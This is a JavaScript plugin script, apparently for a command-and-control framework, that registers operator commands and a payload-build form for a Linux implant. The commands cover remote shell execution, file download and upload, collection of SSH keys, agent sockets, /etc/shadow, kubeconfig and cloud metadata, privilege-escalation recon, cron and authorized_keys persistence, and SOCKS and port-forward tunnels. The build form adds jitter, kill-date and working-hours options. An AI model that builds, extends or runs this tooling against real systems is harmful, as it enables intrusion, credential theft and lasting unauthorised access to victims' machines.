// Access menu for tunnels (SOCKS4/5, local/remote port forwarding)
let tunnel_access_action = menu.create_action("Create Tunnel", function(value) { ax.open_access_tunnel(value[0], true, true, true, true) });
menu.add_session_access(tunnel_access_action, ["linux"]);

// ================= COMMANDS =================
function RegisterCommands(listenerType) {
    let cmd_cat = ax.create_command("cat", "Read a file", "cat /etc/passwd", "Task: cat");
    cmd_cat.addArgString("path", true, "File path");

    let cmd_cd = ax.create_command("cd", "Change working directory", "cd /tmp", "Task: cd");
    cmd_cd.addArgString("path", true, "Directory path");

    let cmd_cp = ax.create_command("cp", "Copy file or directory", "cp /etc/passwd /tmp/passwd", "Task: cp");
    cmd_cp.addArgString("src", true, "Source path");
    cmd_cp.addArgString("dst", true, "Destination path");

    let cmd_download = ax.create_command("download", "Download a file from target", "download /etc/passwd", "Task: download");
    cmd_download.addArgString("path", true, "File path");

    let cmd_exit = ax.create_command("exit", "Terminate agent", "exit", "Task: exit");

    let cmd_kill = ax.create_command("kill", "Kill a process", "kill 1234", "Task: kill");
    cmd_kill.addArgInt("pid", true, "Process ID");

    let cmd_ls = ax.create_command("ls", "List directory contents", "ls /tmp", "Task: ls");
    cmd_ls.addArgString("path", false, "Directory path (default: current)");

    let cmd_mkdir = ax.create_command("mkdir", "Create a directory", "mkdir /tmp/test", "Task: mkdir");
    cmd_mkdir.addArgString("path", true, "Directory path");

    let cmd_mv = ax.create_command("mv", "Move/rename file or directory", "mv /a /b", "Task: mv");
    cmd_mv.addArgString("src", true, "Source path");
    cmd_mv.addArgString("dst", true, "Destination path");

    let cmd_ps = ax.create_command("ps", "List running processes", "ps", "Task: ps");

    let cmd_pwd = ax.create_command("pwd", "Print working directory", "pwd", "Task: pwd");

    let cmd_rm = ax.create_command("rm", "Remove file or directory", "rm /tmp/test", "Task: rm");
    cmd_rm.addArgString("path", true, "Path");

    let cmd_run = ax.create_command("run", "Execute a program", "run id", "Task: run");
    cmd_run.addArgString("program", true, "Program");
    cmd_run.addArgString("args", false, "Arguments");

    let cmd_screenshot = ax.create_command("screenshot", "Capture screenshot", "screenshot", "Task: screenshot");

    let cmd_shell = ax.create_command("shell", "Execute a shell command", "shell id", "Task: shell");
    cmd_shell.addArgString("program", true, "Program (e.g. /bin/bash)");
    cmd_shell.addArgString("args", false, "Arguments");

    let cmd_upload = ax.create_command("upload", "Upload a file to target", "upload /tmp/file", "Task: upload");
    cmd_upload.addArgString("path", true, "Destination path on target");
    cmd_upload.addArgFile("file", true, "Local file");

    let cmd_zip = ax.create_command("zip", "Zip a file or directory", "zip /var/www /tmp/www.zip", "Task: zip");
    cmd_zip.addArgString("src", true, "Source path");
    cmd_zip.addArgString("dst", true, "Destination archive path");

    // Linux-specific
    let cmd_sysinfo = ax.create_command("sysinfo", "System information (kernel, distro, uptime)", "sysinfo", "Task: sysinfo");

    let cmd_env = ax.create_command("env", "Environment variables", "env", "Task: env");

    let cmd_network = ax.create_command("network", "Network interfaces, routes, DNS, listeners", "network", "Task: network");

    let cmd_users = ax.create_command("users", "Users, groups, logged sessions, sudoers", "users", "Task: users");

    let cmd_cron = ax.create_command("cron", "Cron jobs and scheduled tasks", "cron", "Task: cron");

    let cmd_sshkeys = ax.create_command("sshkeys", "Collect SSH keys and authorized_keys", "sshkeys", "Task: sshkeys");

    let cmd_history = ax.create_command("history", "Shell history files", "history", "Task: history");

    let cmd_docker = ax.create_command("docker", "Docker containers, images and socket", "docker", "Task: docker");

    let cmd_services = ax.create_command("services", "Running systemd services", "services", "Task: services");

    let cmd_privesc = ax.create_command("privesc", "Privilege escalation reconnaissance", "privesc", "Task: privesc");

    let cmd_mounts = ax.create_command("mounts", "Mounts, disks and filesystems", "mounts", "Task: mounts");

    let cmd_persist_cron = ax.create_command("persist_cron", "Install cron persistence", "persist_cron /bin/sh -c '...'", "Task: persist_cron");
    cmd_persist_cron.addArgString("program", true, "Command to schedule every 5 minutes");

    let cmd_persist_ssh = ax.create_command("persist_ssh", "Add SSH public key to authorized_keys", "persist_ssh ssh-ed25519 AAAA...", "Task: persist_ssh");
    cmd_persist_ssh.addArgString("program", true, "SSH public key");
    let cmd_getuid = ax.create_command("getuid", "Current user, groups and privileges", "getuid", "Task: getuid");

    let cmd_filesearch = ax.create_command("filesearch", "Search files by name pattern", 'filesearch *.conf', "Task: filesearch");
    cmd_filesearch.addArgString("program", true, "Filename pattern (e.g. *.conf)");

    let cmd_sshagent = ax.create_command("sshagent", "SSH agent socket and private keys", "sshagent", "Task: sshagent");

    let cmd_kubeconfig = ax.create_command("kubeconfig", "Kubernetes config and service account", "kubeconfig", "Task: kubeconfig");

    let cmd_cloudmeta = ax.create_command("cloudmeta", "Cloud instance metadata (AWS/GCP)", "cloudmeta", "Task: cloudmeta");

    let cmd_sleep = ax.create_command("sleep", "Change sleep time and jitter", "sleep 10 0", "Task: sleep");

    let cmd_whoami = ax.create_command("whoami", "Current username", "whoami", "Task: whoami");

    let cmd_hostname = ax.create_command("hostname", "Hostname and FQDN", "hostname", "Task: hostname");

    let cmd_lsof = ax.create_command("lsof", "Open files and listening sockets", "lsof", "Task: lsof");

    let cmd_iptables = ax.create_command("iptables", "Firewall rules (iptables/nftables)", "iptables", "Task: iptables");

    let cmd_last = ax.create_command("last", "Recent login sessions", "last", "Task: last");

    let cmd_shadow = ax.create_command("shadow", "Read /etc/shadow (needs root)", "shadow", "Task: shadow");

    // SOCKS and port forwarding
    let _socks_start = ax.create_command("start", "Start a SOCKS(4a/5) proxy server", "socks start 1080");
    _socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _socks_start.addArgInt("port", true, "Listen port");
    _socks_start.addArgBool("-socks4", "Use SOCKS4 proxy (Default SOCKS5)");
    _socks_start.addArgBool("-auth", "Enable User/Password authentication for SOCKS5");
    _socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    _socks_start.addArgString("password", false, "Password for SOCKS5 proxy");
    let _socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_socks_start, _socks_stop]);

    let _lpf_start = ax.create_command("start", "Start local port forwarding from server via agent", "lportfwd start 0.0.0.0 8080 192.168.1.1 8080");
    _lpf_start.addArgString("lhost", "Listening interface address on server", "0.0.0.0");
    _lpf_start.addArgInt("lport", true, "Listen port on server");
    _lpf_start.addArgString("fwdhost", true, "Remote forwarding address");
    _lpf_start.addArgInt("fwdport", true, "Remote forwarding port");
    let _lpf_stop = ax.create_command("stop", "Stop local port forwarding", "lportfwd stop 8080");
    _lpf_stop.addArgInt("lport", true);
    let cmd_lportfwd = ax.create_command("lportfwd", "Managing local port forwarding");
    cmd_lportfwd.addSubCommands([_lpf_start, _lpf_stop]);

    let _rpf_start = ax.create_command("start", "Start remote port forwarding from agent via server", "rportfwd start 8080 10.10.10.14 8080");
    _rpf_start.addArgInt("lport", true, "Listen port on agent");
    _rpf_start.addArgString("fwdhost", true, "Remote forwarding address");
    _rpf_start.addArgInt("fwdport", true, "Remote forwarding port");
    let _rpf_stop = ax.create_command("stop", "Stop remote port forwarding", "rportfwd stop 8080");
    _rpf_stop.addArgInt("lport", true);
    let cmd_rportfwd = ax.create_command("rportfwd", "Managing remote port forwarding");
    cmd_rportfwd.addSubCommands([_rpf_start, _rpf_stop]);

    cmd_sleep.addArgString("sleep", true, "Sleep (seconds or duration e.g. 10 or 10s)");
    cmd_sleep.addArgString("jitter", false, "Jitter percent (0-100)");


    let commands = ax.create_commands_group("linux", [
        cmd_cat, cmd_cd, cmd_cp, cmd_download, cmd_exit, cmd_kill, cmd_ls,
        cmd_mkdir, cmd_mv, cmd_ps, cmd_pwd, cmd_rm, cmd_run, cmd_screenshot,
        cmd_shell, cmd_upload, cmd_zip,
        cmd_sysinfo, cmd_env, cmd_network, cmd_users, cmd_cron, cmd_sshkeys,
        cmd_history, cmd_docker, cmd_services, cmd_privesc, cmd_mounts,
        cmd_persist_cron, cmd_persist_ssh,
        cmd_getuid, cmd_filesearch, cmd_sshagent, cmd_kubeconfig, cmd_cloudmeta, cmd_sleep, cmd_whoami, cmd_hostname, cmd_lsof, cmd_iptables, cmd_last, cmd_shadow,
        cmd_socks, cmd_lportfwd, cmd_rportfwd
    ]);

    return { commands_linux: commands };
}

// ================= GENERATE UI =================
function GenerateUI(listeners_type) {
    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo();
    comboArch.addItems(["amd64", "arm64"]);

    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo();
    comboFormat.addItems(["Binary ELF"]);

    let hline = form.create_hline();

    let labelReconnTimeout = form.create_label("Reconnect timeout:");
    let textReconnTimeout = form.create_textline("10");
    textReconnTimeout.setPlaceholder("seconds");

    let labelJitter = form.create_label("Jitter (%):");
    let spinJitter = form.create_spin();
    spinJitter.setRange(0, 100);
    spinJitter.setValue(0);

    let labelKillDate = form.create_label("Kill date:");
    let textKillDate = form.create_textline("");
    textKillDate.setPlaceholder("DD.MM.YYYY hh:mm:ss (empty = disabled)");

    let labelWorkingTime = form.create_label("Working time:");
    let textWorkingTime = form.create_textline("");
    textWorkingTime.setPlaceholder("HH:MM-HH:MM (empty = always)");

    let layout = form.create_gridlayout();
    layout.addWidget(labelArch, 0, 0, 1, 1);
    layout.addWidget(comboArch, 0, 1, 1, 1);
    layout.addWidget(labelFormat, 1, 0, 1, 1);
    layout.addWidget(comboFormat, 1, 1, 1, 1);
    layout.addWidget(hline, 2, 0, 1, 2);
    layout.addWidget(labelReconnTimeout, 3, 0, 1, 1);
    layout.addWidget(textReconnTimeout, 3, 1, 1, 1);
    layout.addWidget(labelJitter, 5, 0, 1, 1);
    layout.addWidget(spinJitter, 5, 1, 1, 1);
    layout.addWidget(labelKillDate, 6, 0, 1, 1);
    layout.addWidget(textKillDate, 6, 1, 1, 1);
    layout.addWidget(labelWorkingTime, 7, 0, 1, 1);
    layout.addWidget(textWorkingTime, 7, 1, 1, 1);

    let container = form.create_container();
    container.put("arch", comboArch);
    container.put("format", comboFormat);
    container.put("reconnect_timeout", textReconnTimeout);
    container.put("jitter", spinJitter);
    container.put("kill_date", textKillDate);
    container.put("working_time", textWorkingTime);

    let panel = form.create_panel();
    panel.setLayout(layout);

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 480,
        ui_width: 500
    };
}
